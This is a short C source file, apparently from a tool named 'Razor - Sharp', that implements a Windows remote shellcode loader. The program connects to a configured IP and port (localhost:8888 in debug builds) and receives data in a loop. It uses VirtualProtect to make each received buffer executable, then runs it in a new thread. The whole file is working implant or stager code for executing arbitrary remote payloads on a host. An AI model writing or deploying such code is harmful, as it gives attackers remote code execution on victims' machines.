#include "Sharp.h"

// Razor - Sharp

#if defined (_DEBUG)
#define IP "127.0.0.1"
#define PORT 8888
#endif

// Thread function that handles the data
DWORD thread_process_data(PINCOMING_HEADER data) {
	DWORD old = 0;
	BOOL b_ret = FALSE;

	b_ret = VirtualProtect(data->data, data->data_length - sizeof(INCOMING_HEADER), PAGE_EXECUTE_READ, &old);
	if (b_ret != FALSE) {
		((VOID(*)()) data->data)(); // TODO: Handle returned data. Right now it is a fire and forget concept.
	}

	free(data);
	data = NULL;

	return 0;
}

INT main(INT argc, CHAR* argv[]) {
	SOCKET client_sock = INVALID_SOCKET;
	HANDLE thread = INVALID_HANDLE_VALUE;
	INT err = 0;
	BYTE* buf = NULL;

	client_sock = get_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP, IP, PORT);
	if (client_sock == INVALID_SOCKET) {
		printf("[!] get_socket(...) failed. Error code: %d\n", WSAGetLastError());
		return -1;
	}

	while (err >= 0) {
		err = recv_all(client_sock, &buf);
		if (err < 0) {
			printf("[!] recv_all(...) failed. Error code: %d\n", WSAGetLastError());
			return -1;
		}

		thread = CreateThread(NULL, 0, thread_process_data, buf, 0, 0);
		if (thread == NULL) {
			printf("[!] CreateThread(...) failed. Error code: %d\n", GetLastError());
			if (buf != NULL) {
				free(buf);
			}
		}

	}

	return 1;
}